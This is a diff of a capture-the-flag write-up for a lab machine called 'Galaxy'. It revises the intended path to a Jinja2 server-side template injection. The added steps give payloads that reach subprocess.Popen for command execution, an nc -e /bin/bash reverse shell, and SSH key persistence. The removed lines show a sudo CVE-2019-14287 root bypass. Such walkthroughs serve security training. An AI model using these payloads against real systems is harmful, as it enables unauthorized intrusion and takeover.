@@ -2,7 +2,8 @@
 
 ## Introduction
 
-Galaxy is easy level machine In this challenge, machine hosting a beta website about cosmic facts. The site was vulnerable to bypassing the 403 Forbidden restriction using the X-Forwarded-For header. After successfully bypassing 403 restriction we can see devs left webshell which uses custom web user after user enumeration we can find box vulnerable to CVE-2019-14287 
+This machine inspired from this bug bounty report: https://hackerone.com/reports/125980<br>
+Galaxy is medium level machine with SSTI vulnerability and CVE-2019-14287 for root part. I suggest medium because getting shell is not straight forward it requires enumeration to get rce via SSTI, however players can do that by googling about SSTI. Player will learn about Popen subclassess and running multiple commands.
 ## Info for HTB
 
 ### Access
@@ -17,10 +18,10 @@ Passwords:
 ### Key Processes
 
 1) SSH server on 22 port
-2) Apache2 server on 80 port which is vulnerable to http host header
-3) There is web shell in /developers directory (in story web site is in beta situation devs unaware of http-header vulnerabilit)
+2) Apache2 server on 80 port which is restricted page vulnerable to SSTI
+3) After enumerating subclasses in SSTI players need to find number of Popen subclass
 4) For root privilege escalation I set CVE-2019-14287 it is from real world and I believe it suits to box story
-5) There is other user besides `web` and `root` (john  lily  tom) and they are dummy users to simulate developers environment and they are shouldn't be rabbit hole because there is nothing there and player will immediatly understand the privelege escalation if they see outdated sudo version (I am okay if htb devs wants to remove them)
+5) There is other user besides `web` and `root` (john) and this is dummy user which has no password. I set them for box story and player needs to critical thinking to get shell after finding out CVE-2019-14287
 
 ### Automation / Crons
 There is no automation
@@ -66,109 +67,114 @@ Let's enumerate directories and subdirectories using ffuf tool:<br>
 ffuf -u http://galaxy.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 ```
 <br>
-We find /developers and /photos directories and we are not allowed to access /developers directory<br>
+We find some directories one of them /developers worth to pay attention<br>
 
-![image](https://github.com/user-attachments/assets/9e1c6a0c-dd6f-4836-85e4-a83ed47ad8f6)
+![image](https://github.com/user-attachments/assets/0f004ee2-4c74-499e-9abd-0e563c7fc92c)
 
+Searching other subdirectories we didn't find anything usefull<br>
+
+Let's try file inclusion with `http://galaxy.htb/developers/../../../etc/passwd` payload<br>
+![image](https://github.com/user-attachments/assets/41a65f0e-d568-4238-9040-fcdf0605a18f)
 <br>
-This message gives idea that maybe developers should be from internal network? Trying to enumerate any subdomains other directory leads us nothing. So we try to find a way to access /developers directory.<br>
-Googling 403 bypass error we find [this](https://github.com/justdoston/403-Bypass) documentation.<br>
-According to documentation trying to add forward headers with 127.0.0.1 ip will work, because server will think user trying to access from internal IP address.<br>
+There is no directory traversal or file inclusion vulnerability, but interesting thing whatever we write to url it get reflected in web page:<br>
+![image](https://github.com/user-attachments/assets/67c68efa-f06b-48af-bf00-cbc3bbbf3b8e)<br>
 
-Let's use proxy forwarding tool such as burp suite to manupulate and try this technique.<br>
-![image](https://github.com/user-attachments/assets/605568f6-ecb7-4b28-a860-f5d9f7f40430)
+After injecting:
+````
+http://galaxy.htb/developers{{7+7}}
+````
+We can confirm there is SSTI vulnerability
+![image](https://github.com/user-attachments/assets/a1acf1be-c195-44e9-9ce4-dae252c2c3cb)
 
-
-`X-Forwarded-For: 127.0.0.1` header successfuly worked to bypass<br>
-![image](https://github.com/user-attachments/assets/3374c55f-ae55-45b0-9f02-3b87781a9c92)
-
-
+We need to know what template used, for that we use this formula:
+![image](https://github.com/user-attachments/assets/14e9e059-81f0-45e6-b9bc-596ef8774d92)
+<br>
+Payload: `{{7*'7'}}`<br>
+![image](https://github.com/user-attachments/assets/04e4f93b-c880-48a3-9114-ecdbbb3483cc)
 
 # Foothold
 
-We use same technique to see content of README.md file:<br>
-![image](https://github.com/user-attachments/assets/b3785047-9a54-42f9-99ba-cc7f56164d91)
+## Enumeration
+
+After searching from [blogs](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) and [PayloadAllThethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md?ref=sec.stealthcopter.com) we need to find `Popen` class for rce<br>
+
+1) First we need to find all classes<br>
+Payload: `{{''.__class__.mro()[1].__subclasses__()}}`
+![image](https://github.com/user-attachments/assets/13d038bf-dbeb-44c0-8ff9-b575a2854b30)
 <br>
-Not much usefull let's take a look to web.php file<br>
-![image](https://github.com/user-attachments/assets/1ce77e27-b006-49be-b5fa-1f321d4f40e7)
+We have hundreds of classes including `Popen` which we will use for command execution
 
+2) We need to find it's number for that we copy all of them paste it to `vi` then hit `ESC` and type: `:%s />/\r/g` and finally use `set number` command to sort them with numbers
+![image](https://github.com/user-attachments/assets/bab7a081-9157-44d8-8411-e5240b4b7da1)
+
+After using `set number` command inside `vi` we will search `Popen`:<br>
+`/Popen`
+![image](https://github.com/user-attachments/assets/01372a62-a9e4-4a53-908f-6b521672c66a)
+We can see it is in number 259, but in programming language number starts from `0` so it should be 258.
 <br>
-It looks like developers left webshell in developers directory, it is because web site hasn't been finished fully yet<br>
-We can copy our own id_rsa.pub (publick key) to web users authorized_keys to login via ssh without a password
-
-```
-echo "public key" > /home/web/.ssh/authorized_keys
-```
-
-
 <br>
-Let's login using our own ssh with id_rsa for more comfortable and stable shell. If you don't have id_rsa keys create using 
+To confirm we use this payload: `{{''.__class__.mro()[1].__subclasses__()[258]}}`
+<br>
+![image](https://github.com/user-attachments/assets/221e32ef-e141-406f-a02e-fd4a06b653de)
 
-<br>`ssh-keygen -t rsa`<br>
-
+Next thing we need to use that process to gain command execution.
+Payload: `{{''.__class__.mro()[1].__subclasses__()[258]('id')}}`
+![image](https://github.com/user-attachments/assets/dfbcb7af-07d5-4905-bf43-61ad0b870f7f)
+Instead we get this error, let's try understand what is happening
+<br>
+We can use python in terminal to simulate similar situation:
+![image](https://github.com/user-attachments/assets/b182b2fe-ae1c-4523-8f70-6fbb7c44a9e8)
+In terminal we can execute command, but we still get `<Popen: returncode: None args: 'id'>` message and it freezes<br>
+Problem is `Popen` needs `.communicate()` and `stdout=-1` commands to get proper output. Read [this](https://forums.linuxmint.com/viewtopic.php?t=356930) documentation
+for more
+<br>
+Final payload:
 ````
-┌──(master㉿kali)-[~/.ssh]
-└─$ ssh -i id_rsa web@192.168.2.106
-Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-50-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
-
- System information as of Fri Jan 24 02:47:24 AM UTC 2025
-
-  System load:  0.0               Processes:               105
-  Usage of /:   33.7% of 7.79GB   Users logged in:         0
-  Memory usage: 9%                IPv4 address for enp0s3: 192.168.2.106
-  Swap usage:   0%
-
- * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
-   just raised the bar for easy, resilient and secure K8s cluster deployment.
-
-   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
-
-Expanded Security Maintenance for Applications is not enabled.
-
-0 updates can be applied immediately.
-
-Enable ESM Apps to receive additional future security updates.
-See https://ubuntu.com/esm or run: sudo pro status
-
-
-Last login: Fri Jan 24 02:19:46 2025 from 192.168.2.107
-$ 
+{{''.__class__.mro()[1].__subclasses__()[258]('id',stdout=-1).communicate()}}
 ````
-user flag can be found in web home directory.<br>
+![image](https://github.com/user-attachments/assets/83cc0bef-8161-458e-9b05-81a2361238cb)
+
+Now we got response!
+
+## Important
+subprocess.Popen and shell works differently. In Popen class you can't just type multiple commands like: "uname -a" or "cat /etc/passwd"
+<br>
+You need `shell=True` or you need to type independently like: `(['cat','/etc/passwd'])`
+![image](https://github.com/user-attachments/assets/8b433d41-c7c7-4525-8b15-eb4aae4bad48)
+
+Lastly to get shell we will use this payload:
+````
+{{''.__class__.mro()[1].__subclasses__()[258](['nc','192.168.X.X','9001','-e','/bin/bash'],stdout=-1).communicate()}}
+````
+Don't forget to set netcat listener!
+
+![image](https://github.com/user-attachments/assets/dec24d30-6acd-4314-b8fb-8aa18547f04d)
+
+We got shell. Let's use ssh to get better shell<br>
+We copy our public key to /home/web/.ssh/authorized_keys:
+```
+echo "your id_rsa.pub key" > /home/web/.ssh/authorized_keys
+```
+If you don't have generate using: `ssh-keygen -t rsa`<br>
+After that we can login using our own private key located in /home/your_username/.ssh:
+````
+ssh -i id_rsa web@galaxy.htb
+````
+![image](https://github.com/user-attachments/assets/78d55493-9b75-416b-a3e8-91a59efb9a07)
+
 
 # Privilege Escalation
-There is README.md file which admin left message to others!
+There is README.txt file let's read it!
 ````
 Dear developers!
 
-We need to finish our beta test as fast as possible, for more comfortable evnironment I made other user accessible from web user!
-Please do not store any sensitive information ! This is office working computers!
+We have ongoing "star map" project! We need to finish it as far as possible. User john has codes in his home directory, but I can not disclose password of user john.
+However you are allowed to copy those codes!
+Available codes:
+star-map.js
+star.html
+stars.js
 ````
-After enumeration we can find user web allowed to user /usr/bin/bash as any user except root since it confirms we can use it for other users:
-````
-User web may run the following commands on galaxy:
-    (ALL, !root) NOPASSWD: /usr/bin/bash
-````
-This means we can use `bash` as other user to access like: `sudo -u john /usr/bin/bash` but sudo forbids if we try to access `root` because of `!root`
-Searching other users directory we find nothing but we should pay attention to sudo version:
-````
-$ sudo -V
-Sudo version 1.8.27
-Sudoers policy plugin version 1.8.27
-Sudoers file grammar version 46
-Sudoers I/O plugin version 1.8.27
-````
-This not latest sudo version and after searching from databases we find this version is vulnerable to CVE-2019-14287.<br>
-According to [this](https://www.exploit-db.com/exploits/47502) documentation we can bypass using:
-````
-sudo -u#-1 /usr/bin/bash
-````
-![image](https://github.com/user-attachments/assets/159f07e4-7200-401b-b264-12246a61181c)
-<br>
-Here wee can see trying to directly access to the root user didn't work but as expected we can bypass it!
+
 
 
